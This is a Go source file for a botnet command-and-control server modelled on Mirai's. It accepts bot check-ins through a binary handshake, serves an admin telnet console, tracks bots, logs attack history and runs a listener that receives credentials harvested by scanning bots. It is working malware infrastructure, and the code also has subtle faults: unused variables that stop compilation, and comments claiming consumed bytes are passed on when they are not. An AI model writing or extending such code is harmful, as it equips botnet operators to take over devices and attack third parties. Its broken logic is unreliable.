// nexus CNC — command & control server
//
// Single binary. Dual-purpose TCP listener on one port:
//   - Bots connect with a binary handshake  \x00\x00\x00\x01
//   - Admins connect via telnet, get an interactive console
//
// Architecture mirrors Mirai's CNC (Go, raw TCP, binary protocol)
// but is written clean, modular, and dependency-free.
//
// Build:  go build -o nexus-cnc .\cnc\
// Run:    .\nexus-cnc.exe -port 19443

package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

var (
	listenPort int
	store      *Storage
	mgr        *Manager
)

func main() {
	flag.IntVar(&listenPort, "port", 19443, "TCP port for both bot connections and admin telnet")
	flag.Parse()

	log.SetFlags(log.Ltime | log.Lshortfile)

	// --- persistence: users + attack history stored as JSON ---
	store = NewStorage("nexus-data.json")
	if err := store.Load(); err != nil {
		log.Printf("[!] no existing data file, starting fresh: %v", err)
	}
	defer store.Save()

	// --- bot registry ---
	mgr = NewManager()

	// --- prune stale bots every 30 seconds ---
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			pruned := mgr.PruneStale(3 * 60 * time.Second) // 3 min timeout
			if pruned > 0 {
				log.Printf("[*] pruned %d stale bots", pruned)
			}
		}
	}()

	// --- scan listener (credential receiver, port 48101) ---
	go StartScanListener(48101)

	// --- single listener, dual protocol ---
	addr := fmt.Sprintf("0.0.0.0:%d", listenPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("failed to bind %s: %v", addr, err)
	}
	log.Printf("[+] nexus CNC listening on %s (bots + admin)", addr)

	// --- graceful shutdown on Ctrl+C ---
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				// listener closed during shutdown
				select {
				case <-sig:
					return
				default:
					log.Printf("[!] accept error: %v", err)
					continue
				}
			}
			go handleConnection(conn)
		}
	}()

	<-sig
	log.Println("[*] shutting down nexus CNC...")
	ln.Close()
	store.Save()
	log.Println("[*] goodbye.")
}

// handleConnection peeks at the first byte to decide:
//   - 0x00 → bot binary handshake
//   - anything else → admin telnet session
func handleConnection(conn net.Conn) {
	// Read first 4 bytes. Bots send 0x00000001 immediately.
	// Telnet clients send IAC negotiation (starts with 0xFF).
	// If nothing arrives in 2 seconds, assume admin.
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	first := make([]byte, 4)
	n, err := io.ReadFull(conn, first)
	conn.SetReadDeadline(time.Time{})

	if err != nil || n < 4 {
		// Timeout or short read — assume admin.
		// Wrap the connection in a reader that prepends whatever we did read.
		reader := bufio.NewReader(conn)
		handleAdmin(conn, reader)
		return
	}

	if first[0] == 0x00 {
		// Bot — prepend the 4 bytes we already read into a buffered reader.
		reader := bufio.NewReader(conn)
		// We already consumed 4 bytes. handleBot expects them to be
		// available in the reader. Create a reader that starts with them.
		handleBotWithFirstBytes(conn, first)
	} else {
		// Admin — but we already ate 4 bytes. Pass them to admin handler.
		reader := bufio.NewReader(conn)
		handleAdmin(conn, reader)
	}
}
